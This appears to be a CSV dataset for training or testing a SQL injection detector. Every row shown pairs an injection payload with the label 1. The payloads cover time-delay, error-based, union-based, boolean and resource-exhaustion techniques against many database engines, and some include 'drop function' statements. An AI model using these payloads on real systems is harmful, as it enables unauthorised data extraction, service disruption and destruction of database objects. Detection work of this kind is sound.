Query,Label
"1"" or sleep  (  5  )   and ""fbuo"" like ""fbuo",1
"1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
-2992'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'tjgt'  =  'tjgt,1
"-3219""  )   order by 1--",1
"1""   )    )     )   or sleep  (  5  )  #",1
"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"  (  select   (  case when   (  1343  =  1343  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1343 end  )   from dual  )  ",1
-6190'  )   where 2621  =  2621 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"1'   )    )    as ezpq where 2976  =  2976 union all select null,null,null,null,null,null,null,null,null,null#",1
"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",1
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""acbq"" like ""acbq",1
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'ltki'  =  'ltki,1
"1'  )   as ezoa where 4915  =  4915 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
-8878' in boolean mode  )   union all select 7785#,1
1'   )    )    and   (  7517  =  3423  )  *3423 and    (    (   'aenz'  =  'aenz,1
-2797'   )    )     )   union all select 5711#,1
"1  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  2303  =  2303",1
1'  )   and   (  3020  =  3020  )  *6703 and   (  'botl' like 'botl,1
"iif  (  9875  =  8961,1,1/0  )  ",1
"-7843' where 5986  =  5986 or make_set  (  9354  =  9354,7185  )  --",1
"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",1
"1"" where 3221  =  3221 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
-7466 where 5161  =  5161 or 3038  =  3038,1
"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,1
"-4477'   )    )    union all select 8444,8444,8444,8444,8444,8444,8444,8444--",1
"1%' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and '%'  =  '",1
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",1
"-8999"" where 2821  =  2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",1
"1  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  3039  =  3039",1
"1""   )    )     )   rlike sleep  (  5  )  #",1
"1' in boolean mode  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  #",1
"1"" where 8672  =  8672 union all select null,null#",1
if  (  4907  =  9581  )   select 4907 else drop function apqw--,1
"1' where 9222  =  9222 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1  )   as itvm where 1482  =  1482,1
-6912' in boolean mode  )   union all select 6012--,1
"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",1
"1'+  (  select pepf where 5071  =  5071 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""  )   as lipa where 3450  =  3450 and make_set  (  8403  =  8403,8899  )  --",1
"1'  )   where 6081  =  6081 union all select null,null,null,null,null,null,null,null,null--",1
waitfor delay '0:0:5' and    (    (   'uvlf'  =  'uvlf,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,1
"1""  )   where 2367  =  2367",1
-6616  )   order by 1--,1
"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""kzcd""  =  ""kzcd",1
-4137   )    )    as elxu where 5672  =  5672 order by 1--,1
if  (  8812  =  7896  )   select 8812 else drop function xltk--,1
-3559'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1
-7707'   )    )    union all select 3172#,1
waitfor delay '0:0:5'#,1
"-5082   )    )    union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",1
1'  )   rlike   (  select   (  case when   (  2721  =  8716  )   then 1 else 0x28 end   )    )    and   (  'dumt'  =  'dumt,1
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'pehq' like 'pehq,1
"1  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-7796'  )   union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",1
"-7499%""  )   union all select 1893,1893,1893,1893,1893#",1
1' where 2958  =  2958,1
"1%""  )   and 4595  =  4595#",1
1'  )   as ftyp where 5851  =  5851 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"1%'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  '%'  =  '",1
1' in boolean mode  )   and 7533  =  7533#,1
"1'||  (  select 'yrau' where 7860  =  7860 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1
1'||  (  select 'tisi' from dual where 1616  =  1616 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ||',1
"-9954""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""bifi""  =  ""bifi",1
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'rpiz' like 'rpiz",1
"-9953'||  (  select 'zljk' where 2886  =  2886 union all select 2886,2886,2886,2886,2886,2886,2886,2886,2886,2886#",1
"1' in boolean mode  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1'   )    )    as fbjd where 8597  =  8597,1
1   )    )    as ipfy where 1189  =  1189,1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  '%'  =  ',1
1'   )    )    as tlsl where 8467  =  8467,1
if  (  3392  =  4422  )   select 3392 else drop function xsqq--,1
"-2718"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""xwbf""  =  ""xwbf",1
1 where 6494  =  6494 and 8463  =  2760,1
"1' and elt  (  4249  =  4249,7259  )  ",1
"1"" and 7533  =  7533 and ""btak"" like ""btak",1
"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",1
"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"iif  (  1217  =  8831,1,1/0  )  ",1
-6540'  )   where 5019  =  5019 or   (  8459  =  8459  )  *4906--,1
"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",1
"1%' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
-8639  )   or 8138  =  6252,1
"-5667%'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '",1
"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1,  (  case when 5514  =  9602 then 1 else null end  )  ",1
"1%""   )    )     )   waitfor delay '0:0:5'--",1
"1""  )   where 4905  =  4905 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- zvkh",1
"-6198""  )   or make_set  (  3602  =  2178,2178  )   and   (  ""xksq"" like ""xksq",1
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
" end and    (    (   ""cxoi""  =  ""cxoi",1
"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",1
"1""  )   where 9086  =  9086 or sleep  (  5  )  #",1
"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",1
"1""   )    )    as dpln where 4193  =  4193 rlike sleep  (  5  )  --",1
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",1
-6487  )   or 6872  =  6872 and   (  7688  =  7688,1
-9054   )    )     )   or 9323  =  9323#,1
"1'||  (  select 'zrea' from dual where 1223  =  1223 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
1'  )   where 6624  =  6624 and 5392  =  8258,1
"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'msol'  =  'msol",1
"iif  (  4836  =  1823,1,1/0  )  ",1
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",1
"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",1
1'+  (  select 'tmel' where 2655  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else 0x28 end   )    )     )  +',1
"-1413""  )   union all select 6651,6651,6651--",1
-5708 where 3134  =  3134 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
"1  )   and make_set  (  8403  =  8403,8899  )  ",1
"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",1
"1""   )    )    as xbhp where 7527  =  7527",1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""eaqk""  =  ""eaqk",1
-2783%'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   '%'  =  ',1
"-4135'   )    )     )   union all select 4413,4413,4413#",1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  '%'  =  '",1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,1
"1'+  (  select kgon where 9014  =  9014   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   +'",1
select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,1
1  )   as ptxw where 9873  =  9873,1
"1%""  )   union all select null,null--",1
"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",1
1'||  (  select 'jslz' where 8405  =  8405 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',1
"1  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  7244  =  7244",1
1   )    )     )   and 4595  =  4595#,1
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
"1""  )   where 9093  =  9093",1
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1
-2055  )   or 3038  =  3038,1
"1'+  (  select 'suzs' where 2905  =  2905 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'",1
select   (  case when   (  4769  =  4769  )   then 4769 else 4769*  (  select 4769 from mysql.db  )   end  )  #,1
"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'cpoy'  =  'cpoy",1
"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1
"select pg_sleep  (  5  )   and    (    (   ""%""  =  """,1
"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1'||  (  select 'irfn' where 8360  =  8360,1
"1%""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""%""  =  """,1
"-5840'  )   or elt  (  1032  =  1032,3623  )  ",1
-9355' or 6872  =  6872 and 'mztk'  =  'mztk,1
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""bkoq""  =  ""bkoq",1
"1   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
